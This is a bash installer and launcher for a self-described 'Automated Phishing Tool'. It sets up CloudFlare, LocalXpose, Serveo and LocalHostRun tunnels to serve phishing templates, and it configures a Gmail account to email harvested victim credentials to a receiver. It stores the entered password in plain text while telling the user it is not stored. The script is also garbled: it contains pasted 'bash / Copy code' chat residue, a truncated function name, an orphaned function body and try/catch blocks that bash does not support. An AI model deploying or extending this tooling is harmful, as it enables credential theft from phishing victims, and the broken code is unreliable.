        echo -e "\n${error}Failed to download CloudFlare tunnel! You can manually download it from: ${cyan}https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/download"
        echo -e "${info2}Extract the downloaded file and move the 'cloudflared' binary to the ${cyan}~/.tunneler${info2} directory."
        echo -e "${info2}Make sure to add the directory to your ${cyan}PATH${info2} environment variable."
        echo -e "${info2}Refer to the documentation for more details: ${cyan}https://github.com/hackryan/fnck_cloudflare_tunnelz/wiki/Manual-Installation"
        exit
    }
fi

# LocalXpose tunnel
if [[ ! -f "$HOME/.tunneler/loclx" ]]; then
    internet
    echo -e "${info2}Downloading LocalXpose tunnel..."

    try {
        curl -o "$HOME/.tunneler/loclx" -L "$lx_url" 2>/dev/null
        chmod +x "$HOME/.tunneler/loclx"
    } catch {
        append "$error" "$error_file"
        echo -e "\n${error}Failed to download LocalXpose tunnel! You can manually download it from: ${cyan}https://localxpose.io/download"
        echo -e "${info2}Extract the downloaded file and move the 'loclx' binary to the ${cyan}~/.tunneler${info2} directory."
        echo -e "${info2}Make sure to add the directory to your ${cyan}PATH${info2} environment variable."
        echo -e "${info2}Refer to the documentation for more details: ${cyan}https://github.com/hackryan/fnck_cloudflare_tunnelz/wiki/Manual-Installation"
        exit
    }
fi

# Install additional packages for Serveo (necessary for password-based authentication)
if [[ "$os" == "Linux" && ! -f "/usr/sbin/sshd" ]]; then
    if [[ "$os_codename" == "bionic" || "$os_codename" == "focal" ]]; then
        apt-get install openssh -y
    fi
fi

clear_fast

echo -e "\n${info}${green}Tunnelers have been successfully configured!"
echo -e "${info2}Checking tunnelers..."

# Check CloudFlare tunnel
if [[ ! -f "$HOME/.tunneler/cloudflared" ]]; then
    cf_command="no"
else
    cf_command="$("$HOME/.tunneler/cloudflared" --version)"
fi

# Check LocalXpose tunnel
if [[ ! -f "$HOME/.tunneler/loclx" ]]; then
    lx_command="no"
else
    lx_command="$("$HOME/.tunneler/loclx" --version | awk 'NR==1')"
fi

# Check if an email account is set up for receiving credentials
if [[ -f "config/account.config" ]]; then
    is_mail_ok="$(grep "email =" "config/account.config" | awk '{print $3}' | tr -d ' ')"
fi

# Check if email is configured
if [[ -z "$is_mail_ok" || "$is_mail_ok" == "None" ]]; then
    read -p $'\n'"$ask${bcyan}Do you want to configure email to receive credentials? [y/n] > ${green}" email
else
    email="n"
fi

# Configure email
if [[ "$email" == "y" ]]; then
    internet
    echo -e "${info2}Configuring email..."

    read -p $'\n'"$ask${bcyan}Enter your Gmail address (e.g., example@gmail.com) > " email
    read -p $'\n'"$ask${bcyan}Enter your Gmail password (your password is not stored) > " password
    read -p $'\n'"$ask${bcyan}Enter the email address where you want to receive credentials > " receiver

    # Validate email address format
    if ! [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}$ ]]; then
        echo -e "\n${error}Invalid email address format!"
        email="n"
    else
        email="y"
    fi

    if [[ "$email" == "y" ]]; then
        # Store email details
        echo "email = $email" > "config/account.config"
        echo "password = $password" >> "config/account.config"
        echo "receiver = $receiver" >> "config/account.config"

        # Install required packages for sending email
        if [[ -n "$termux" ]]; then
            apt install sendmail -y
        else
            if [[ -n "$apt" ]]; then
                apt install sendmail -y
            elif [[ -n "$yum" ]]; then
                yum install sendmail -y
            fi
        fi

        clear_fast

        echo -e "\n${info}${green}Email has been successfully configured!"
    else
        clear_fast
        echo -e "\n${info}Email configuration cancelled."
    fi
elif [[ "$email" == "n" ]]; then
    clear_fast
    echo -e "${info}Email will not be configured."
else
    clear_fast
    echo -e "${error}Invalid input! Email will not be configured."
fi

sleep 2
clear_fast

# Check CloudFlare tunnel
if [[ "$cf_command" == "no" ]]; then
    echo -e "\n${error}CloudFlare tunnel not found! Please install it manually from: ${cyan}https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/download"
else
    echo -e "\n${info2}CloudFlare tunnel: ${green}$cf_command"
fi

# Check LocalXpose tunnel
if [[ "$lx_command" == "no" ]]; then
    echo -e "${error}LocalXpose tunnel not found! Please install it manually from: ${cyan}https://localxpose.io/download"
else
    echo -e "${info2}LocalXpose tunnel: ${green}$lx_command"
fi

echo -e "\n${info2}Installation completed successfully!"
sleep 2

clear_fast

# Check if Serveo is working
if [[ "$os" == "Linux" && ! -f "/usr/sbin/sshd" ]]; then
    echo -e "${info2}Serveo requires OpenSSH to be installed. You can install it manually using the following command:"
    echo -e "${green}sudo apt install openssh -y${nc}"
    echo -e "${info2}Once installed, run the following command to start the OpenSSH service:"
    echo -e "${green}sudo service ssh start${nc}"
else
    echo -e "${info2}Checking Serveo..."

    try {
        ssh -V
    } catch {
        append "$error" "$error_file"
        echo -e "${error}Serveo is not installed or not working properly! You can install it manually by following the instructions in the documentation: ${cyan}https://github.com/hackryan/fnck_cloudflare_tunnelz/wiki/Manual-Installation"
    }
fi

# Check if ngrok is working
echo -e "${info2}Checking ngrok..."

try {
    ngrok --version
} catch {
    append "$error" "$error_file"
    echo -e "${error}ngrok is not installed or not working properly! You can install it manually by following the instructions in the documentation: ${cyan}https://github.com/hackryan/fnck_cloudflare_tunnelz/wiki/Manual-Installation"
}

sleep 2
clear_fast

echo -e "${info}${green}fnck_cloudflare_tunnelz has been successfully installed!"
echo -e "${info2}You can now run fnck_cloudflare_tunnelz by using the command: ${cyan}fnck_cloudflare_tunnelz${nc}"
echo -e "${info2}For a list of available commands, use: ${cyan}fnck_cloudflare_tunnelz --help${nc}"

# Check for updates after installation
updater

exit
}
rint_help() {
clear
echo -e "${blue}"
echo -e "fnck_cloudflare_tunnelz - Automated Phishing Tool"
echo -e "Version: $version"
echo -e "Author: hackryan"
echo -e "GitHub: https://github.com/hackryan/fnck_cloudflare_tunnelz"
echo -e "Documentation: https://github.com/hackryan/fnck_cloudflare_tunnelz/wiki"
echo -e "Support: https://github.com/hackryan/fnck_cloudflare_tunnelz/issues"
echo -e "-------------------------------------------------------"
echo -e "Usage: fnck_cloudflare_tunnelz [options] [tunnelers] [templates]"
echo -e "Options:"
echo -e " -h, --help Display this help message"
echo -e " -v, --version Display the version of fnck_cloudflare_tunnelz"
echo -e " -u, --update Update fnck_cloudflare_tunnelz to the latest version"
echo -e " -l, --list List available tunnelers and templates"
echo -e " -t, --test Test if fnck_cloudflare_tunnelz dependencies are installed"
echo -e "Tunnelers:"
echo -e " --cf, --cloudflare Use CloudFlare tunnel for phishing (default)"
echo -e " --lx, --localxpose Use LocalXpose tunnel for phishing"
echo -e " --lhr, --localhostrun Use LocalHostRun tunnel for phishing"
echo -e " --svo, --serveo Use Serveo tunnel for phishing"
echo -e "Templates:"
echo -e " -a, --all Use all templates (default)"
echo -e " -w, --web Use web templates only"
echo -e " -s, --social Use social engineering templates only"
echo -e " -g, --games Use game-related templates only"
echo -e " -o, --other Use other templates only"
echo -e " -c, --custom Use custom templates only"
echo -e "-------------------------------------------------------"
echo -e "Examples:"
echo -e " fnck_cloudflare_tunnelz --cf --web Start fnck_cloudflare_tunnelz with CloudFlare tunnel and web templates"
echo -e " fnck_cloudflare_tunnelz --svo --social Start fnck_cloudflare_tunnelz with Serveo tunnel and social engineering templates"
echo -e " fnck_cloudflare_tunnelz --list List available tunnelers and templates"
echo -e " fnck_cloudflare_tunnelz --update Update fnck_cloudflare_tunnelz to the latest version"
echo -e "${nc}"
exit
}
parse_args() {
local positional_args=()
local tunneler_set=false
local template_set=false
for arg in "$@"; do
    case "$arg" in
        -h|--help)
            print_help
            ;;
        -v|--version)
            echo -e "\nfnck_cloudflare_tunnelz - Automated Phishing Tool"
            echo -e "Version: $version\n"
            exit
            ;;
        -u|--update)
            updater
            ;;
        -l|--list)
            list_options
            exit
            ;;
        -t|--test)
            test_dependencies
            exit
            ;;
        --cf|--cloudflare)
            tunneler="CloudFlare"
            tunneler_set=true
            ;;
        --lx|--localxpose)
            tunneler="LocalXpose"
            tunneler_set=true
            ;;
        --lhr|--localhostrun)
            tunneler="LocalHostRun"
            tunneler_set=true
            ;;
        --svo|--serveo)
            tunneler="Serveo"
            tunneler_set=true
            ;;
        -a|--all)
            template="all"
            template_set=true
            ;;
        -w|--web)
            template="web"
            template_set=true
            ;;
        -s|--social)
            template="social"
            template_set=true
            ;;
        -g|--games)
            template="games"
            template_set=true
            ;;
        -o|--other)
            template="other"
            template_set=true
            ;;
        -c|--custom)
            template="custom"
            template_set=true
            ;;
        *)
            positional_args+=("$arg")
            ;;
    esac
done

if ! $tunneler_set; then
    tunneler="CloudFlare"
fi

if ! $template_set; then
    template="all"
fi

if [[ "${#positional_args[@]}" -gt 0 ]]; then
    url="${positional_args[0]}"
fi

if [[ "${#positional_args[@]}" -gt 1 ]]; then
    mask="${positional_args[1]}"
fi
}
internet() {
clear_fast
echo -e "${info2}Checking internet connectivity..."
if ! ping -q -c 1 -W 1 8.8.8.8 &>/dev/null; then
    echo -e "${error}No internet connectivity detected!"
    echo -e "${info2}Please make sure you are connected to the internet and try again."
    exit
fi
}

check_root() {
if [[ "$(id -u)" -eq 0 ]]; then
echo -e "${error}fnck_cloudflare_tunnelz should not be run as the root user!"
echo -e "${info2}Please run fnck_cloudflare_tunnelz as a non-root user with sudo privileges."
exit
fi
}
## support

check_environment() {
os="$(uname -s)"
os_codename=""
if [[ -n "$(command -v lsb_release)" ]]; then
    os_codename="$(lsb_release -c -s)"
elif [[ -n "$(command -v sw_vers)" ]]; then
    os_codename="$(sw_vers -productVersion)"
fi

termux=""
apt=""
yum=""
brew=""
wsl=""
apt_keys=()

if [[ -d "$HOME/../usr" && -d "$HOME/../data/data/com.termux/files/usr" ]]; then
    termux="yes"
    os="Linux"
elif [[ -n "$(command -v apt)" ]]; then
    apt="yes"
elif [[ -n "$(command -v yum)" ]]; then
    yum="yes"
elif [[ -n "$(command -v brew)" ]]; then
    brew="yes"
elif [[ -n "$(command -v wsl)" ]]; then
    wsl="yes"
else
    echo -e "${error}Unsupported operating system or package manager!"
    echo -e "${info2}- currently supports the following environments:"
    echo -e "${info2}- Linux (apt or yum package manager)"
    echo -e "${info2}- macOS (Homebrew package manager)"
    echo -e "${info2}- Termux (Android)"
    echo -e "${info2}- Windows Subsystem for Linux (WSL, Ubuntu 20.04 or later)"
    exit
fi
}
check_packages() {
echo -e "${info2}Checking required packages..."
if [[ -n "$termux" ]]; then
    pkg_list=("python" "python2" "wget" "curl" "php" "ruby" "unzip" "zip" "nano" "vim" "proot" "neofetch" "nodejs" "python3-pip" "php-apache")
elif [[ -n "$apt" ]]; then
    pkg_list=("git" "python" "python2" "wget" "curl" "php" "ruby" "unzip" "zip" "nano" "vim" "proot" "neofetch" "nodejs" "python3-pip" "php-apache")
elif [[ -n "$yum" ]]; then
    pkg_list=("git" "python" "python2" "wget" "curl" "php" "ruby" "unzip" "zip" "nano" "vim" "proot" "neofetch" "nodejs" "python3-pip" "httpd")
elif [[ -n "$brew" ]]; then
    pkg_list=("git" "python" "python2" "wget" "curl" "php" "ruby" "unzip" "zip" "nano" "vim" "neofetch" "node" "python@3.9" "php@7.4")
elif [[ -n "$wsl" ]]; then
    pkg_list=("git" "python" "python2" "wget" "curl" "php" "ruby" "unzip" "zip" "nano" "vim" "proot" "neofetch" "nodejs" "python3-pip" "php-apache")
fi

missing_pkgs=()

for pkg in "${pkg_list[@]}"; do
    if [[ ! -n "$(command -v $pkg)" ]]; then
        missing_pkgs+=("$pkg")
    fi
done

if [[ "${#missing_pkgs[@]}" -gt 0 ]]; then
    echo -e "${error}Required packages are missing! Installing them..."

    install_packages "${missing_pkgs[@]}"
fi
}
if [[ -n "$termux" ]]; then
    apt update -y
    apt upgrade -y
    apt install "${pkgs[@]}" -y
elif [[ -n "$apt" ]]; then
    apt update -y
    apt upgrade -y
    apt install "${pkgs[@]}" -y
elif [[ -n "$yum" ]]; then
    yum update -y
    yum install "${pkgs[@]}" -y
elif [[ -n "$brew" ]]; then
    brew update
    brew install "${pkgs[@]}"
elif [[ -n "$wsl" ]]; then
    apt-get update -y
    apt-get upgrade -y
    apt-get install "${pkgs[@]}" -y
fi

clear_fast

echo -e "${info}${green}Required packages have been successfully installed!"
}
check_pip_packages() {
echo -e "${info2}Checking required Python packages..."
local pip_pkgs=("requests" "colorama" "tqdm" "Pillow")

missing_pip_pkgs=()

for pip_pkg in "${pip_pkgs[@]}"; do
    if ! python3 -c "import $pip_pkg" 2>/dev/null; then
        missing_pip_pkgs+=("$pip_pkg")
    fi
done

if [[ "${#missing_pip_pkgs[@]}" -gt 0 ]]; then
    echo -e "${error}Required Python packages are missing! Installing them..."

    for pip_pkg in "${missing_pip_pkgs[@]}"; do
        pip3 install "$pip_pkg"
    done
fi
}
check_brew_services() {
if [[ -n "$brew" ]]; then
echo -e "${info2}Checking for Brew services..."
    if ! brew services list 2>/dev/null; then
        echo -e "${error}Brew services are not available!"
        echo -e "${info2}Please make sure you have Brew installed and configured properly."
        exit
    fi
fi
}
create_directories() {
if [[ ! -d "$HOME/.tunneler" ]]; then
mkdir -p "$HOME/.tunneler"
fi
if [[ ! -d "$HOME/.fnck_cloudflare_tunnelz" ]]; then
    mkdir -p "$HOME/.fnck_cloudflare_tunnelz"
fi
}
initialize_fnck_cloudflare_tunnelz() {
if [[ ! -f "$HOME/.fnck_cloudflare_tunnelz/config.json" ]]; then
cp "config/default-config.json" "$HOME/.fnck_cloudflare_tunnelz/config.json"
fi

bash
Copy code
if [[ ! -d "$HOME/.fnck_cloudflare_tunnelz/templates" ]]; then
    mkdir -p "$HOME/.fnck_cloudflare_tunnelz/templates"
fi

if [[ ! -d "$HOME/.fnck_cloudflare_tunnelz/logs" ]]; then
    mkdir -p "$HOME/.fnck_cloudflare_tunnelz/logs"
fi

if [[ ! -d "$HOME/.fnck_cloudflare_tunnelz/results" ]]; then
    mkdir -p "$HOME/.fnck_cloudflare_tunnelz/results"
fi

if [[ ! -d "$HOME/.fnck_cloudflare_tunnelz/screenshots" ]]; then
    mkdir -p "$HOME/.fnck_cloudflare_tunnelz/screenshots"
fi

if [[ ! -d "$HOME/.fnck_cloudflare_tunnelz/attachments" ]]; then
    mkdir -p "$HOME/.fnck_cloudflare_tunnelz/attachments"
fi

if [[ ! -d "$HOME/.fnck_cloudflare_tunnelz/mails" ]]; then
    mkdir -p "$HOME/.fnck_cloudflare_tunnelz/mails"
fi

if [[ ! -d "$HOME/.fnck_cloudflare_tunnelz/www" ]]; then
    mkdir -p "$HOME/.fnck_cloudflare_tunnelz/www"
fi
}
update_fnck_cloudflare_tunnelz() {
echo -e "${info2}Updating fnck_cloudflare_tunnelz to the latest version..."
try {
    git stash -u
    git pull origin main
    git stash pop
} catch {
    append "$error" "$error_file"
    echo -e "${error}Failed to update fnck_cloudflare_tunnelz! You can manually update it by running the following commands:"
    echo -e "${cyan}cd $fnck_cloudflare_tunnelz_dir"
    echo -e "git stash -u"
    echo -e "git pull origin main"
    echo -e "git stash pop"
    echo -e "chmod +x fnck_cloudflare_tunnelz"
    echo -e "${info2}Refer to the documentation for more details: ${cyan}https://github.com/hackryan/fnck_cloudflare_tunnelz/wiki/Manual-Installation"
    exit
}

echo -e "${info}${green}fnck_cloudflare_tunnelz has been successfully updated to the latest version!"
sleep 2
exit
}
List available tunnelers and templates
list_options() {
clear
echo -e "${blue}"
echo -e "fnck_cloudflare_tunnelz - Available Options"
echo -e "Version: $version"
echo -e "Author: hackryan"
echo -e "GitHub: https://github.com/hackryan/fnck_cloudflare_tunnelz"
echo -e "Documentation: https://github.com/hackryan/fnck_cloudflare_tunnelz/wiki"
echo -e "Support: https://github.com/hackryan/fnck_cloudflare_tunnelz/issues"
echo -e "-------------------------------------------------------"
echo -e "Tunnelers:"
echo -e " --cf, --cloudflare Use CloudFlare tunnel for phishing (default)"
echo -e " --lx, --localxpose Use LocalXpose tunnel for phishing"
echo -e " --lhr, --localhostrun Use LocalHostRun tunnel for phishing"
echo -e " --svo, --serveo Use Serveo tunnel for phishing"
echo -e "Templates:"
echo -e " -a, --all Use all templates (default)"
echo -e " -w, --web Use web templates only"
echo -e " -s, --social Use social engineering templates only"
echo -e " -g, --games Use game-related templates only"
echo -e " -o, --other Use other templates only"
echo -e " -c, --custom Use custom templates only"
echo -e "-------------------------------------------------------"
echo -e "Examples:"
echo -e " fnck_cloudflare_tunnelz --cf --web Start fnck_cloudflare_tunnelz with CloudFlare tunnel and web templates"
echo -e " fnck_cloudflare_tunnelz --svo --social Start fnck_cloudflare_tunnelz with Serveo tunnel and social engineering templates"
echo -e " fnck_cloudflare_tunnelz --list List available tunnelers and templates"
echo -e " fnck_cloudflare_tunnelz --update Update fnck_cloudflare_tunnelz to the latest version"
echo -e "${nc}"
exit
}

test_dependencies() {
check_environment
check_packages
check_pip_packages
check_brew_services
clear_fast
echo -e "${info}${green}All required dependencies are installed and configured properly!"
echo -e "${info2}You can now start using fnck_cloudflare_tunnelz."
exit
}
check_update() {
echo -e "${info2}Checking for updates..."
try {
    git fetch origin
    latest_commit="$(git rev-parse origin/main)"
    current_commit="$(git rev-parse HEAD)"

    if [[ "$latest_commit" != "$current_commit" ]]; then
        is_up_to_date="no"
    fi
} catch {
    is_up_to_date="yes"
}
}
updater() {
check_update
if [[ "$is_up_to_date" == "no" ]]; then
    echo -e "${info}${green}An update is available for fnck_cloudflare_tunnelz!"
    echo -e "${info2}Do you want to update to the latest version? [y/n] > ${green}"
    read -n 1 update_choice
    echo -e "${nc}"

    if [[ "$update_choice" == "y" ]]; then
        update_fnck_cloudflare_tunnelz
    else
        clear_fast
        echo -e "${info}You can update fnck_cloudflare_tunnelz manually by running the following commands:"
        echo -e "${cyan}cd $fnck_cloudflare_tunnelz_dir"
        echo -e "git stash -u"
        echo -e "git pull origin main"
        echo -e "git stash pop"
        echo -e "chmod +x fnck_cloudflare_tunnelz"
        echo -e "${info2}Refer to the documentation for more details: ${cyan}https://github.com/hackryan/fnck_cloudflare_tunnelz/wiki/Manual-Installation"
        exit
    fi
else
    clear_fast
    echo -e "${info}${green}fnck_cloudflare_tunnelz is up-to-date!"
fi
}
start_fnck_cloudflare_tunnelz() {
echo -e "${info2}Starting fnck_cloudflare_tunnelz..."
clear_fast
if [[ -z "$url" ]]; then
    read -p $'\n'"$ask${bcyan}Enter the URL > ${green}" url
fi

if [[ -z "$mask" ]]; then
    read -p $'\n'"$ask${bcyan}Enter the mask (optional) > ${green}" mask
fi

if [[ -n "$mask" ]]; then
    mask_arg="--mask $mask"
fi

case "$template" in
    all)
        templates_arg="--all"
        ;;
    web)
        templates_arg="--web"
        ;;
    social)
        templates_arg="--social"
        ;;
    games)
        templates_arg="--games"
        ;;
    other)
        templates_arg="--other"
        ;;
    custom)
        templates_arg="--custom"
        ;;
    *)
        templates_arg="--all"
        ;;
esac

if [[ "$tunneler" == "CloudFlare" ]]; then
    $cloudflare_tunnel "$url" $mask_arg $templates_arg
elif [[ "$tunneler" == "LocalXpose" ]]; then
    $localxpose_tunnel "$url" $mask_arg $templates_arg
elif [[ "$tunneler" == "LocalHostRun" ]]; then
    $localhostrun_tunnel "$url" $mask_arg $templates_arg
elif [[ "$tunneler" == "Serveo" ]]; then
    $serveo_tunnel "$url" $mask_arg $templates_arg
fi
}
# Main function
main() {
    check_root
    internet
    parse_args "$@"
    create_directories
    check_environment
    check_packages
    check_pip_packages
    check_brew_services
    initialize_fnck_cloudflare_tunnelz

    if [[ -z "$1" ]]; then
        print_banner
        start_fnck_cloudflare_tunnelz
    else
        start_fnck_cloudflare_tunnelz
    fi
}

# Run the main function
main "$@"








